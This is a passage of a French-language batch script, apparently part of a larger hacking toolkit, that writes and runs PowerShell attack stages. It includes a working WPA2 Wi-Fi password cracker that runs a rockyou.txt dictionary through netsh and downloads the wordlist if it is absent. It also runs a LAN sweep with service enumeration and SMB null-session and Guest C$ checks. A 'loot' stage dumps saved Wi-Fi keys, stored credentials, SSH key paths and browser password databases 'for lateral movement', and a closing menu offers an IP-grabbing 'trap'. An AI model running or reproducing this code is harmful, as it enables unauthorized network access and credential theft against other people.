endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%"
goto net_menu_wifi

:net_wifi_target
goto net_wifi_scan

:net_wifi_crack
setlocal enabledelayedexpansion
cls
echo.
echo %B%  ================================================%N%
echo %B%   CRACK CLE WI-FI - WPA2/WPA%N%
echo %B%  ================================================%N%
echo.
echo  %C%[i] Reseau cible : %WIFI_TARGET_SSID%%N%
if "%WIFI_TARGET_SSID%"=="" (
    echo  %Y%[!] Aucune cible selectionnee. Lance d'abord Analyser une Cible.%N%
    pause >nul & goto net_menu_wifi
)
echo.
set "NWC=%TEMP%\net_wificrack_%RANDOM%.ps1"
set "WIFI_ROCKYOU=%~dp0rockyou.txt"
>  "%NWC%" echo $ssid=[string]$env:WIFI_TARGET_SSID
>> "%NWC%" echo netsh wlan delete profile name="$ssid" ^>$null 2^>$null
>> "%NWC%" echo Write-Host ''
>> "%NWC%" echo Write-Host '  [1/2] Preparation wordlist rockyou.txt...' -f Cyan
>> "%NWC%" echo $wlFile="$env:WIFI_ROCKYOU"
>> "%NWC%" echo foreach($loc in @("$env:WIFI_ROCKYOU","$env:USERPROFILE\rockyou.txt","$env:USERPROFILE\Downloads\rockyou.txt","$env:USERPROFILE\Desktop\rockyou.txt","C:\tools\rockyou.txt")){if(Test-Path $loc){$wlFile=$loc;break}}
>> "%NWC%" echo if(-not (Test-Path $wlFile)){
>> "%NWC%" echo     Write-Host '  [^>] rockyou.txt introuvable. Telechargement automatique (~134 MB)...' -f Yellow
>> "%NWC%" echo     $url='https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
>> "%NWC%" echo     try{
>> "%NWC%" echo         Write-Host '  [^>] Telechargement en cours (~134 MB, 1-2 min)...' -f Yellow
>> "%NWC%" echo         (New-Object System.Net.WebClient).DownloadFile($url,$wlFile)
>> "%NWC%" echo         Write-Host '  [OK] Telechargement termine.' -f Green
>> "%NWC%" echo     }catch{
>> "%NWC%" echo         Write-Host "  [ERR] Echec telechargement : $_" -f Red
>> "%NWC%" echo         Write-Host "  [i] Placez rockyou.txt dans le dossier du script." -f Yellow
>> "%NWC%" echo         $null=Read-Host '  ENTREE pour continuer...'; exit 1
>> "%NWC%" echo     }
>> "%NWC%" echo }else{Write-Host "  [OK] Wordlist trouvee : $wlFile" -f Green}
>> "%NWC%" echo Write-Host ''
>> "%NWC%" echo Write-Host "  [2/2] Attaque dictionnaire sur reseau : $ssid" -f Cyan
>> "%NWC%" echo Write-Host '  [i] Methode : connexion reelle Windows (~5 sec/essai)' -f DarkGray
>> "%NWC%" echo Write-Host '  [i] Appuyez sur ECHAP pour interrompre.' -f DarkGray
>> "%NWC%" echo Write-Host ''
>> "%NWC%" echo $found=$false;$i=0;$t0=Get-Date
>> "%NWC%" echo $tmpXml="$env:TEMP\wt_$([System.IO.Path]::GetRandomFileName()).xml"
>> "%NWC%" echo Write-Host '  [i] Deconnexion initiale...' -f DarkGray
>> "%NWC%" echo netsh wlan disconnect ^>$null 2^>$null
>> "%NWC%" echo Start-Sleep -Seconds 3
>> "%NWC%" echo $reader=[System.IO.StreamReader]::new($wlFile)
>> "%NWC%" echo while($null -ne ($w=$reader.ReadLine())){
>> "%NWC%" echo     if([Console]::KeyAvailable){$k=[Console]::ReadKey($true);if($k.Key -eq 'Escape'){Write-Host ''; Write-Host '  [--] Attaque interrompue par ECHAP.' -f Yellow; break}}
>> "%NWC%" echo     if($w.Length -lt 8 -or $w.Length -gt 63){continue}
>> "%NWC%" echo     $i++
>> "%NWC%" echo     $el=[math]::Round(((Get-Date)-$t0).TotalMinutes,1)
>> "%NWC%" echo     Write-Host "`r  [>>] Essai #$i : $w | Ecoule:${el}min    " -NoNewline -f DarkGray
>> "%NWC%" echo     netsh wlan disconnect ^>$null 2^>$null
>> "%NWC%" echo     $x='^<?xml version="1.0"?^>'
>> "%NWC%" echo     $x+='^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>'
>> "%NWC%" echo     $x+='^<name^>'+$ssid+'^</name^>'
>> "%NWC%" echo     $x+='^<SSIDConfig^>^<SSID^>^<name^>'+$ssid+'^</name^>^</SSID^>^</SSIDConfig^>'
>> "%NWC%" echo     $x+='^<connectionType^>ESS^</connectionType^>'
>> "%NWC%" echo     $x+='^<connectionMode^>manual^</connectionMode^>'
>> "%NWC%" echo     $x+='^<MSM^>^<security^>^<authEncryption^>'
>> "%NWC%" echo     $x+='^<authentication^>WPA2PSK^</authentication^>'
>> "%NWC%" echo     $x+='^<encryption^>AES^</encryption^>'
>> "%NWC%" echo     $x+='^<useOneX^>false^</useOneX^>^</authEncryption^>'
>> "%NWC%" echo     $x+='^<sharedKey^>^<keyType^>passPhrase^</keyType^>'
>> "%NWC%" echo     $x+='^<protected^>false^</protected^>'
>> "%NWC%" echo     $x+='^<keyMaterial^>'+$w+'^</keyMaterial^>^</sharedKey^>'
>> "%NWC%" echo     $x+='^</security^>^</MSM^>^</WLANProfile^>'
>> "%NWC%" echo     $x ^| Out-File $tmpXml -Encoding UTF8
>> "%NWC%" echo     netsh wlan add profile filename="$tmpXml" ^>$null 2^>$null
>> "%NWC%" echo     netsh wlan connect name="$ssid" ssid="$ssid" ^>$null 2^>$null
>> "%NWC%" echo     $ok=$false;$t2=0
>> "%NWC%" echo     while($t2 -lt 20){
>> "%NWC%" echo         Start-Sleep -Seconds 1;$t2++
>> "%NWC%" echo         $st=[string](netsh wlan show interfaces ^| Where-Object{$_ -match 'Etat^|State'} ^| Select-Object -First 1)
>> "%NWC%" echo         $st=($st -replace '.*:\s*').Trim()
>> "%NWC%" echo         if($st -match '^^connect[^^i]'){$ok=$true;break}
>> "%NWC%" echo         if($t2 -ge 8 -and $st -notmatch 'connect'){break}
>> "%NWC%" echo     }
>> "%NWC%" echo     if($ok){
>> "%NWC%" echo         Write-Host ''
>> "%NWC%" echo         Write-Host '  ============================================' -f Green
>> "%NWC%" echo         Write-Host "  [CRACK] MOT DE PASSE TROUVE : $w" -f Green
>> "%NWC%" echo         Write-Host '  ============================================' -f Green
>> "%NWC%" echo         $found=$true; netsh wlan disconnect ^>$null 2^>$null; break
>> "%NWC%" echo     }
>> "%NWC%" echo     netsh wlan delete profile name="$ssid" ^>$null 2^>$null
>> "%NWC%" echo }
>> "%NWC%" echo $reader.Close()
>> "%NWC%" echo if(Test-Path $tmpXml){Remove-Item $tmpXml -Force}
>> "%NWC%" echo Write-Host ''
>> "%NWC%" echo if(-not $found){Write-Host "  [--] Non trouve apres $i tentatives. Wordlist insuffisante." -f DarkGray}
>> "%NWC%" echo Write-Host '  Appuyez sur ENTREE pour revenir au menu...' -f Yellow
>> "%NWC%" echo $null=Read-Host
powershell -NoProfile -ExecutionPolicy Bypass -File "%NWC%"
set "crack_exit=%errorlevel%"
if exist "%NWC%" del /f /q "%NWC%"
echo.
echo.
endlocal
goto net_menu_wifi

:net_menu_interne
set "lan_pipe_opts=Pipeline Complet~[1] Scan -> [2] Web -> [3] Services -> [4] Failles -> [5] Extraction;[1] Scan de Presence~Detecte IP, Nom, MAC, Constructeur sur le LAN;[2] Interfaces Web~Ports 80, 443, 8080, 8443 - Routeurs, NAS, Cameras;[3] Enumeration Services~SSH, RDP, FTP, VNC, Telnet, Imprimantes;[4] Verification Failles~Partages C$ et acces Guest SMB;[5] Extraction Locale~Wi-Fi, credentials, historique navigateurs;[---];Outils Avances~Flux reseau, DNS, Triage;Retour"
call :DynamicMenu "RESEAU INTERNE - DECOUVERTE LAN" "!lan_pipe_opts!" "NONUMS"
set "lan_ch=%errorlevel%"
if "!lan_ch!"=="0" goto net_cyber_menu
if "!lan_ch!"=="1" (set "lan_pipeline=1" & goto net_fast_discover)
if "!lan_ch!"=="2" (set "lan_pipeline=" & goto net_fast_discover)
if "!lan_ch!"=="3" (set "lan_pipeline=" & goto net_web_hunt)
if "!lan_ch!"=="4" (set "lan_pipeline=" & goto net_service_enum)
if "!lan_ch!"=="5" (set "lan_pipeline=" & goto net_vuln_check)
if "!lan_ch!"=="6" (set "lan_pipeline=" & goto sys_loot_all)
if "!lan_ch!"=="7" goto lan_outils_avances
if "!lan_ch!"=="8" goto net_cyber_menu
goto net_menu_interne

:lan_outils_avances
set "_net_back="
call :AutoMenu "OUTILS RESEAU AVANCES" "cyber_triage;cyber_flux_analysis;cyber_dns_leak;cyber_lan_auto"
if "!errorlevel!"=="0" goto net_menu_interne
set "_net_back=lan_outils_avances"
goto !AutoMenu_Target!

:net_menu_distant
goto cyber_ip_grabber

REM ===================================================================
REM   PIPELINE RESEAU INTERNE - DECOUVERTE SEQUENTIELLE
REM ===================================================================

:net_fast_discover
cls
echo.
echo %B%  ================================================%N%
echo %B%   [1/5] SCAN DE PRESENCE LAN%N%
echo %B%  ================================================%N%
echo.
echo  %Y%[i]%N% Detection automatique du reseau local...
echo  %Y%[i]%N% Appuyez sur ECHAP pour annuler.
echo.
set "NFD=%TEMP%\net_discover_%RANDOM%.ps1"
set "LAN_HOSTS=%TEMP%\lan_discover.txt"
if exist "%LAN_HOSTS%" del /f /q "%LAN_HOSTS%"
if exist "%NFD%" del /f /q "%NFD%"

>  "%NFD%" echo $oui=@{'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi';'E4-5F-01'='Raspberry Pi';'00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'A4-77-33'='Samsung';'48-D6-D5'='Xiaomi';'00-1A-11'='Google';'00-FF-BB'='Microsoft';'38-07-16'='Freebox';'E4-9E-12'='Freebox';'00-11-32'='Synology';'00-50-56'='VMware';'08-00-27'='VirtualBox';'52-54-00'='QEMU';'00-1B-21'='Intel';'00-23-AE'='Intel'}
>> "%NFD%" echo $route=Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
>> "%NFD%" echo $myIp=(Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress
>> "%NFD%" echo if(-not $myIp){Write-Host '  [!] Impossible de detecter le reseau local.' -f Red;exit 1}
>> "%NFD%" echo $base=($myIp -split '\.')[0..2] -join '.'
>> "%NFD%" echo Write-Host "  Votre IP : $myIp  |  Plage : $base.1 - $base.254" -f Cyan
>> "%NFD%" echo Write-Host ''
>> "%NFD%" echo $outFile='%LAN_HOSTS%'
>> "%NFD%" echo if(Test-Path $outFile){Remove-Item $outFile -Force}
>> "%NFD%" echo Write-Host '  [1/2] Lancement de 254 pings simultanees...' -f DarkGray
>> "%NFD%" echo $alive=New-Object System.Collections.Generic.List[string]
>> "%NFD%" echo $pingItems=1..254 ^| ForEach-Object {
>> "%NFD%" echo     $ip="$base.$_"
>> "%NFD%" echo     $p=New-Object System.Net.NetworkInformation.Ping
>> "%NFD%" echo     @{Ping=$p;IP=$ip;Task=$p.SendPingAsync($ip,500)}
>> "%NFD%" echo }
>> "%NFD%" echo Write-Host '  [>] Attente des reponses...' -f DarkGray
>> "%NFD%" echo foreach($item in $pingItems){
>> "%NFD%" echo     try{
>> "%NFD%" echo         $r=$item.Task.GetAwaiter().GetResult()
>> "%NFD%" echo         if($r.Status -eq 'Success'){$alive.Add($item.IP);Write-Host "  [ping] $($item.IP) repond !" -f Green}
>> "%NFD%" echo     }catch{}
>> "%NFD%" echo }
>> "%NFD%" echo if($alive.Count -eq 0){Write-Host '  [-] Aucun hote detecte.' -f Yellow;exit 1}
>> "%NFD%" echo Write-Host ''
>> "%NFD%" echo Write-Host "  [2/2] Resolution DNS + MAC pour $($alive.Count) hote(s)..." -f Cyan
>> "%NFD%" echo Write-Host ''
>> "%NFD%" echo $macMap=@{}
>> "%NFD%" echo Get-NetNeighbor -AddressFamily IPv4 -EA SilentlyContinue ^| ForEach-Object{ if($_.LinkLayerAddress -and $_.LinkLayerAddress -notmatch '^0+[-:]0+'){$macMap[$_.IPAddress]=$_.LinkLayerAddress.ToUpper().Replace(':','-')} }
>> "%NFD%" echo foreach($line in (arp -a)){ if($line -match '^\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2}-[0-9a-f]{2})\s' -and -not $macMap[$matches[1]]){ $macMap[$matches[1]]=$matches[2].ToUpper() } }
>> "%NFD%" echo $found=0
>> "%NFD%" echo foreach($ip in ($alive ^| Sort-Object{[Version]$_})){
>> "%NFD%" echo     Write-Host "  [?] $ip" -NoNewline -f DarkGray
>> "%NFD%" echo     $name=$ip
>> "%NFD%" echo     $dnsTask=[System.Net.Dns]::GetHostEntryAsync($ip)
>> "%NFD%" echo     $mac=if($macMap[$ip]){$macMap[$ip]}else{''}
>> "%NFD%" echo     $brand=''
>> "%NFD%" echo     if($mac){$pre=$mac.Substring(0,[Math]::Min(8,$mac.Length));$brand=if($oui.ContainsKey($pre)){$oui[$pre]}else{$pre}}
>> "%NFD%" echo     if($dnsTask.Wait(1500)){try{$name=$dnsTask.Result.HostName}catch{}}
>> "%NFD%" echo     Write-Host "`r  [+] $($ip.PadRight(16)) $($brand.PadRight(14)) $name          " -f Green
>> "%NFD%" echo     "$ip;$name;$mac;$brand" ^| Out-File -Append $outFile -Encoding ASCII
>> "%NFD%" echo     $found++
>> "%NFD%" echo }
>> "%NFD%" echo Write-Host ''
>> "%NFD%" echo if($found -eq 0){Write-Host '  [-] Aucun hote detecte.' -f Yellow}else{Write-Host "  [OK] $found machine(s) detectee(s). Resultats sauvegardes." -f Cyan}
powershell -NoProfile -ExecutionPolicy Bypass -File "%NFD%"
if exist "%NFD%" del /f /q "%NFD%"
echo.
if not exist "%LAN_HOSTS%" (
    echo  %R%[!] Aucun hote trouve. Pipeline arrete.%N%
    pause >nul
    set "lan_pipeline="
    goto net_menu_interne
)
if defined lan_pipeline (
    echo  %G%[>] Etape 1 terminee. Appuyez sur une touche pour continuer vers l'etape 2...%N%
    pause >nul
    goto net_web_hunt
)
call :DynamicMenu "ETAPE 1 TERMINEE - CONTINUER ?" "Continuer vers Chasse Interfaces Web~[Etape 2/5];Retour au menu Reseau Interne" "NONUMS NOCLS"
if "%errorlevel%"=="1" goto net_web_hunt
set "lan_pipeline="
goto net_menu_interne

:net_web_hunt
set "LAN_HOSTS=%TEMP%\lan_discover.txt"
set "LAN_WEB=%TEMP%\lan_web.txt"
cls
echo.
echo %B%  ================================================%N%
echo %B%   [2/5] CHASSE AUX INTERFACES WEB%N%
echo %B%  ================================================%N%
echo.
if not exist "%LAN_HOSTS%" (
    echo  %Y%[!] Aucun resultat de scan disponible. Lancez d'abord l'etape 1.%N%
    pause >nul & goto net_menu_interne
)
echo  %Y%[i]%N% Test des ports 80, 443, 8080, 8443 sur chaque hote...
echo.
set "NWH=%TEMP%\net_webhunt_%RANDOM%.ps1"
set "LAN_WEB=%TEMP%\lan_web.txt"
if exist "%NWH%" del /f /q "%NWH%"
if exist "%LAN_WEB%" del /f /q "%LAN_WEB%"

>  "%NWH%" echo $hosts=Get-Content "%LAN_HOSTS%" -EA SilentlyContinue
>> "%NWH%" echo if(-not $hosts){Write-Host "  [!] Fichier hotes introuvable." -f Red; exit 1}
>> "%NWH%" echo $webPorts=@(80,443,8080,8443)
>> "%NWH%" echo $portNames=@{80='HTTP';443='HTTPS';8080='HTTP-Alt';8443='HTTPS-Alt'}
>> "%NWH%" echo [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
>> "%NWH%" echo $webFile='%LAN_WEB%'
>> "%NWH%" echo $hits=0
>> "%NWH%" echo foreach($line in $hosts){
>> "%NWH%" echo     $parts=$line -split ';'; if($parts.Count -lt 1){continue}
>> "%NWH%" echo     $ip=$parts[0]; $name=if($parts[1]){$parts[1]}else{$ip}
>> "%NWH%" echo     $openPorts=@()
>> "%NWH%" echo     foreach($p in $webPorts){
>> "%NWH%" echo         $tcp=New-Object System.Net.Sockets.TcpClient
>> "%NWH%" echo         try{$c=$tcp.BeginConnect($ip,$p,$null,$null);if($c.AsyncWaitHandle.WaitOne(300,$false) -and $tcp.Connected){$openPorts+=$p}}catch{}finally{$tcp.Close()}
>> "%NWH%" echo     }
>> "%NWH%" echo     if($openPorts.Count -gt 0){
>> "%NWH%" echo         $hits++
>> "%NWH%" echo         $portStr=($openPorts ^| ForEach-Object{ $portNames[$_]+':'+$_ }) -join '  '
>> "%NWH%" echo         Write-Host ("  [WEB] "+$ip.PadRight(16)+" "+$name.PadRight(22)+" "+$portStr) -f Green
>> "%NWH%" echo         foreach($p in $openPorts){$proto=if($p -eq 443 -or $p -eq 8443){'https'}else{'http'};($ip+';'+$name+';'+$p+';'+$proto) ^| Out-File -Append $webFile -Encoding ASCII}
>> "%NWH%" echo         $p0=$openPorts[0];$pr0=if($p0 -eq 443 -or $p0 -eq 8443){'https'}else{'http'}
>> "%NWH%" echo         try{$req=[Net.WebRequest]::Create($pr0+'://'+$ip+':'+[string]$p0);$req.Timeout=2000;$resp=$req.GetResponse();$svr=$resp.Headers['Server'];$resp.Close();if($svr){Write-Host ('        -> '+$svr) -f DarkCyan}}catch{}
>> "%NWH%" echo     }
>> "%NWH%" echo }
>> "%NWH%" echo Write-Host ""
>> "%NWH%" echo if($hits -eq 0){Write-Host "  [-] Aucune interface web trouvee." -f Yellow}else{Write-Host "  [OK] $hits machine(s) avec interface web detectee(s)." -f Cyan}
powershell -NoProfile -ExecutionPolicy Bypass -File "%NWH%"
if exist "%NWH%" del /f /q "%NWH%"
echo.
if defined lan_pipeline (
    echo  %G%[>] Etape 2 terminee. Appuyez sur une touche pour continuer vers l'etape 3...%N%
    pause >nul
    goto net_service_enum
)
call :DynamicMenu "ETAPE 2 TERMINEE - CONTINUER ?" "Continuer vers Enumeration des Services~[Etape 3/5];Retour au menu Reseau Interne" "NONUMS NOCLS"
if "%errorlevel%"=="1" goto net_service_enum
set "lan_pipeline="
goto net_menu_interne

:net_service_enum
set "LAN_HOSTS=%TEMP%\lan_discover.txt"
cls
echo.
echo %B%  ================================================%N%
echo %B%   [3/5] ENUMERATION DES SERVICES%N%
echo %B%  ================================================%N%
echo.
if not exist "%LAN_HOSTS%" (
    echo  %Y%[!] Aucun resultat de scan disponible. Lancez d'abord l'etape 1.%N%
    pause >nul & goto net_menu_interne
)
echo  %Y%[i]%N% Detection SSH, Telnet, RDP, FTP, VNC, Imprimantes...
echo.
set "NSE=%TEMP%\net_svcen_%RANDOM%.ps1"
if exist "%NSE%" del /f /q "%NSE%"

>  "%NSE%" echo $hosts=Get-Content "%LAN_HOSTS%" -EA SilentlyContinue
>> "%NSE%" echo if(-not $hosts){exit 1}
>> "%NSE%" echo $svcPorts=@{21='FTP';22='SSH';23='Telnet';111='RPC';515='Imprimante';631='IPP';3389='RDP';5900='VNC';5901='VNC-2';9100='RAW-Print'}
>> "%NSE%" echo $hits=0; $idx=0; $total=$hosts.Count
>> "%NSE%" echo foreach($line in $hosts){
>> "%NSE%" echo     $parts=$line -split ';'; if($parts.Count -lt 1){continue}
>> "%NSE%" echo     $ip=$parts[0]; $name=if($parts[1]){$parts[1]}else{$ip}
>> "%NSE%" echo     $idx++
>> "%NSE%" echo     Write-Host "  [?] ($idx/$total) $($ip.PadRight(16)) $name..." -NoNewline -f DarkGray
>> "%NSE%" echo     $tasks=$svcPorts.Keys ^| ForEach-Object{ $pt=$_; $tcp=New-Object System.Net.Sockets.TcpClient; @{Port=$pt;Name=$svcPorts[$pt];Task=$tcp.ConnectAsync($ip,$pt);TCP=$tcp} }
>> "%NSE%" echo     Start-Sleep -Milliseconds 400
>> "%NSE%" echo     $found=@()
>> "%NSE%" echo     foreach($t in $tasks){ if(-not $t.Task.IsFaulted -and $t.TCP.Connected){$found+=@{P=$t.Port;N=$t.Name}}; try{$t.TCP.Close()}catch{} }
>> "%NSE%" echo     if($found.Count -gt 0){
>> "%NSE%" echo         $hits++
>> "%NSE%" echo         $svcStr=($found ^| Sort-Object{$_.P} ^| ForEach-Object{$_.N+':'+$_.P}) -join '  '
>> "%NSE%" echo         Write-Host "`r  [SVC] $($ip.PadRight(16)) $name - $svcStr          " -f Green
>> "%NSE%" echo         if(($found ^| Where-Object{$_.P -eq 23})){Write-Host "        [!] Telnet detecte - protocole en clair !" -f Red}
>> "%NSE%" echo         if(($found ^| Where-Object{$_.P -eq 3389})){Write-Host "        [!] RDP ouvert - bruteforce possible" -f Yellow}
>> "%NSE%" echo         if(($found ^| Where-Object{$_.P -eq 5900 -or $_.P -eq 5901})){Write-Host "        [!] VNC detecte - acces ecran possible" -f Yellow}
>> "%NSE%" echo     } else {
>> "%NSE%" echo         Write-Host "`r  [--] $($ip.PadRight(16)) $name          " -f DarkGray
>> "%NSE%" echo     }
>> "%NSE%" echo }
>> "%NSE%" echo Write-Host ""
>> "%NSE%" echo if($hits -eq 0){Write-Host "  [-] Aucun service sensible detecte." -f Yellow}else{Write-Host "  [OK] $hits machine(s) avec services detectes." -f Cyan}
powershell -NoProfile -ExecutionPolicy Bypass -File "%NSE%"
if exist "%NSE%" del /f /q "%NSE%"
echo.
if defined lan_pipeline (
    echo  %G%[>] Etape 3 terminee. Appuyez sur une touche pour continuer vers l'etape 4...%N%
    pause >nul
    goto net_vuln_check
)
call :DynamicMenu "ETAPE 3 TERMINEE - CONTINUER ?" "Continuer vers Verification des Failles~[Etape 4/5];Retour au menu Reseau Interne" "NONUMS NOCLS"
if "%errorlevel%"=="1" goto net_vuln_check
set "lan_pipeline="
goto net_menu_interne

:net_vuln_check
set "LAN_HOSTS=%TEMP%\lan_discover.txt"
cls
echo.
echo %B%  ================================================%N%
echo %B%   [4/5] VERIFICATION DES FAILLES%N%
echo %B%  ================================================%N%
echo.
if not exist "%LAN_HOSTS%" (
    echo  %Y%[!] Aucun resultat de scan disponible. Lancez d'abord l'etape 1.%N%
    pause >nul & goto net_menu_interne
)
echo  %Y%[i]%N% Test des partages C$, Admin$ et sessions null (SMB)...
echo.
set "NVC=%TEMP%\net_vuln_%RANDOM%.ps1"
if exist "%NVC%" del /f /q "%NVC%"

>  "%NVC%" echo $hosts=Get-Content "%LAN_HOSTS%" -EA SilentlyContinue
>> "%NVC%" echo if(-not $hosts){exit 1}
>> "%NVC%" echo $vulns=0; $idx=0; $total=$hosts.Count
>> "%NVC%" echo foreach($line in $hosts){
>> "%NVC%" echo     $parts=$line -split ';'; if($parts.Count -lt 1){continue}
>> "%NVC%" echo     $ip=$parts[0]; $name=if($parts[1]){$parts[1]}else{$ip}
>> "%NVC%" echo     $idx++
>> "%NVC%" echo     Write-Host "  [?] ($idx/$total) Test SMB $($ip.PadRight(16)) $name..." -NoNewline -f DarkGray
>> "%NVC%" echo     $tcp=New-Object System.Net.Sockets.TcpClient
>> "%NVC%" echo     $smbOpen=$false
>> "%NVC%" echo     try{$c=$tcp.BeginConnect($ip,445,$null,$null);if($c.AsyncWaitHandle.WaitOne(400,$false) -and $tcp.Connected){$smbOpen=$true}}catch{}finally{$tcp.Close()}
>> "%NVC%" echo     if(-not $smbOpen){Write-Host "`r  [--] $($ip.PadRight(16)) $name - port 445 ferme          " -f DarkGray;continue}
>> "%NVC%" echo     Write-Host "`r  [SMB] $($ip.PadRight(16)) $name - port 445 ouvert" -f Yellow
>> "%NVC%" echo     Write-Host "        [1/2] Test session nulle IPC$..." -NoNewline -f DarkGray
>> "%NVC%" echo     $null=cmd /c ('net use \\'+$ip+'\IPC$ /user:"" "" /persistent:no ^<nul 2^>^&1')
>> "%NVC%" echo     if($LASTEXITCODE -eq 0){
>> "%NVC%" echo         $vulns++
>> "%NVC%" echo         Write-Host "`r        [CRITIQUE] Session null IPC$ acceptee - enumeration possible !" -f Red
>> "%NVC%" echo         cmd /c ('net use \\'+$ip+'\IPC$ /delete ^>nul 2^>^&1') ^| Out-Null
>> "%NVC%" echo     } else { Write-Host "`r        [OK] IPC$ : session null refusee          " -f DarkGray }
>> "%NVC%" echo     Write-Host "        [2/2] Test acces C$ en Guest..." -NoNewline -f DarkGray
>> "%NVC%" echo     $null=cmd /c ('net use \\'+$ip+'\C$ /user:Guest "" /persistent:no ^<nul 2^>^&1')
>> "%NVC%" echo     if($LASTEXITCODE -eq 0){
>> "%NVC%" echo         $vulns++
>> "%NVC%" echo         Write-Host "`r        [CRITIQUE] C$ accessible en Guest - acces fichiers ouvert !" -f Red
>> "%NVC%" echo         cmd /c ('net use \\'+$ip+'\C$ /delete ^>nul 2^>^&1') ^| Out-Null
>> "%NVC%" echo     } else { Write-Host "`r        [OK] C$ : acces Guest refuse          " -f DarkGray }
>> "%NVC%" echo }
>> "%NVC%" echo Write-Host ""
>> "%NVC%" echo if($vulns -eq 0){Write-Host "  [OK] Aucune faille SMB evidente detectee." -f Green}else{Write-Host "  [!] $vulns faille(s) critique(s) detectee(s) !" -f Red}
powershell -NoProfile -ExecutionPolicy Bypass -File "%NVC%"
if exist "%NVC%" del /f /q "%NVC%"
echo.
if defined lan_pipeline (
    echo  %G%[>] Etape 4 terminee. Appuyez sur une touche pour continuer vers l'etape 5...%N%
    pause >nul
    goto sys_loot_all
)
call :DynamicMenu "ETAPE 4 TERMINEE - CONTINUER ?" "Continuer vers Extraction Locale~[Etape 5/5];Retour au menu Reseau Interne" "NONUMS NOCLS"
if "%errorlevel%"=="1" goto sys_loot_all
set "lan_pipeline="
goto net_menu_interne

:sys_loot_all
set "lan_pipeline="
cls
echo.
echo %B%  ================================================%N%
echo %B%   [5/5] EXTRACTION LOCALE - SECRETS ET CREDENTIALS%N%
echo %B%  ================================================%N%
echo.
echo  %Y%[i]%N% Extraction des secrets locaux pour lateral movement...
echo.
set "SLA=%TEMP%\sys_loot_%RANDOM%.ps1"
if exist "%SLA%" del /f /q "%SLA%"

>  "%SLA%" echo Write-Host "  === MOT DE PASSE WI-FI ===" -f Cyan
>> "%SLA%" echo $profiles=netsh wlan show profiles 2>$null ^| Select-String "Profil d'utilisateur|User Profile" ^| ForEach-Object { ($_ -split ':')[1].Trim() }
>> "%SLA%" echo if($profiles){foreach($p in $profiles){$k=netsh wlan show profile name="$p" key=clear 2>$null ^| Select-String "Contenu de la|Key Content";if($k){$pass=($k -split ':')[1].Trim();Write-Host ("  [WIFI] "+$p.PadRight(30)+" Pass: "+$pass) -f Green}else{Write-Host ("  [WIFI] "+$p.PadRight(30)+" (pas de mot de passe)") -f DarkGray}}}else{Write-Host "  [-] Aucun profil Wi-Fi." -f DarkGray}
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  === CREDENTIAL MANAGER ===" -f Cyan
>> "%SLA%" echo $credOutput=cmdkey /list 2>$null
>> "%SLA%" echo if($credOutput){$credOutput ^| Where-Object {$_ -match "Cible|Target|Utilisateur|User"} ^| ForEach-Object {Write-Host ("  [CRED] "+$_.Trim()) -f Yellow}}else{Write-Host "  [-] Aucun credential stocke." -f DarkGray}
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  === SESSIONS ACTIVES ===" -f Cyan
>> "%SLA%" echo Write-Host ("  [SES] "+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name+" (session courante)") -f Gray
>> "%SLA%" echo Get-LocalUser ^| Where-Object {$_.Enabled -and $_.LastLogon} ^| Sort-Object LastLogon -Descending ^| Select-Object -First 5 ^| ForEach-Object { Write-Host ("  [USR] "+$_.Name+" - Derniere connexion : "+$_.LastLogon.ToString('dd/MM/yyyy HH:mm')) -f DarkGray }
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  === PARTAGES RESEAU CONNECTES ===" -f Cyan
>> "%SLA%" echo net use 2>$null ^| Where-Object {$_ -match '\\'} ^| ForEach-Object {Write-Host ("  [USE] "+$_.Trim()) -f Yellow}
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  === CLES SSH LOCALES ===" -f Cyan
>> "%SLA%" echo $sshDir="$env:USERPROFILE\.ssh"
>> "%SLA%" echo if(Test-Path $sshDir){Get-ChildItem $sshDir ^| Where-Object {-not $_.Name.EndsWith('.pub')} ^| ForEach-Object {Write-Host ("  [SSH] "+$_.FullName) -f Green}}else{Write-Host "  [-] Aucune cle SSH locale." -f DarkGray}
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  === MOTS DE PASSE NAVIGATEURS (presence) ===" -f Cyan
>> "%SLA%" echo $loginDb="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
>> "%SLA%" echo if(Test-Path $loginDb){Write-Host "  [CHROME] Base Login Data presente - extractible avec outil dedie" -f Yellow}else{Write-Host "  [-] Chrome Login Data absent." -f DarkGray}
>> "%SLA%" echo $edgeDb="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
>> "%SLA%" echo if(Test-Path $edgeDb){Write-Host "  [EDGE] Base Login Data presente - extractible avec outil dedie" -f Yellow}else{Write-Host "  [-] Edge Login Data absent." -f DarkGray}
>> "%SLA%" echo Write-Host ""
>> "%SLA%" echo Write-Host "  [DONE] Extraction terminee." -f Cyan
powershell -NoProfile -ExecutionPolicy Bypass -File "%SLA%"
if exist "%SLA%" del /f /q "%SLA%"
echo.
pause >nul
goto net_menu_interne

REM ===================================================================
:cyber_ip_grabber
REM   ASSISTANT SCANNER DISTANT - IP Grabber + Scanner fusionnes
set "opts=J'ai deja l'IP ou le DNS de la cible;Je n'ai pas l'IP - Creer un piege"
call :DynamicMenu "AVEZ-VOUS L'IP DE LA CIBLE ?" "%opts%" "NONUMS"
set "ds_ch=%errorlevel%"
if "%ds_ch%"=="0" goto net_cyber_menu
if "%ds_ch%"=="1" goto ds_saisir_ip
if "%ds_ch%"=="2" goto gm_traps_menu
goto cyber_ip_grabber

:ds_saisir_ip
REM --- Construire menu depuis ip distant.txt ---
